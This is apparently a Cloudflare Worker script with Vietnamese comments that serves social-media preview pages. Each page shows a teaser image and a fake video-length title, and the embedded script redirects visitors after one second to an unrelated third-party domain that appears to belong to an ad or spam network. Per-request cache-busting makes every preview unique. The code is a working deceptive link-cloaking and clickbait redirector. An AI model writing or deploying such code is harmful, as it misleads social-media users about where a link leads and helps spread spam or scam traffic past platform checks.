export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // Lấy slug từ URL
    // Ví dụ: /api/anh123 → anh123
    const match = url.pathname.match(/^\/api\/([^/]+)$/);

    const slug = match ? match[1] : "anh3";

    // Link chuyển hướng
    const redirectUrl = "https://baggyrepackingrocky.com/2022576";

    // Tạo danh sách ảnh
    const images = {};

    for (let i = 1; i <= 2040; i++) {
      images[`anh${i}`] = `https://www.vidiy.fit/IMG (${i}).png`;
    }

    // Lấy ảnh tương ứng với slug
    // Nếu slug không tồn tại → dùng IMG (3).png
    const baseImageUrl =
      images[slug] || "https://www.vidiy.fit/IMG (3).png";

    // Unique ID
    const uniqueId =
      Date.now() + Math.random().toString(36).substring(2, 9);

    const imageUrl = `${baseImageUrl}?v=${uniqueId}`;

    const title = "69:07";
    const description = "Check out this amazing content!";

    const pageUrl = `${url.origin}/${slug}`;

    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">

  <title>${title}</title>

  <!-- Twitter Card -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="${title}">
  <meta name="twitter:description" content="${description}">
  <meta name="twitter:image" content="${imageUrl}">
  <meta name="twitter:url" content="${redirectUrl}">

  <!-- Open Graph -->
  <meta property="og:type" content="website">
  <meta property="og:title" content="${title}">
  <meta property="og:description" content="${description}">
  <meta property="og:image" content="${imageUrl}">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">
  <meta property="og:url" content="${pageUrl}">
</head>

<body>

  <script>
    setTimeout(function() {
      window.location.href = ${JSON.stringify(redirectUrl)};
    }, 1000);
  </script>

</body>
</html>`;

    return new Response(html, {
      status: 200,
      headers: {
        "Content-Type": "text/html; charset=UTF-8",
        "Cache-Control": "no-store, no-cache, must-revalidate"
      }
    });
  }
};
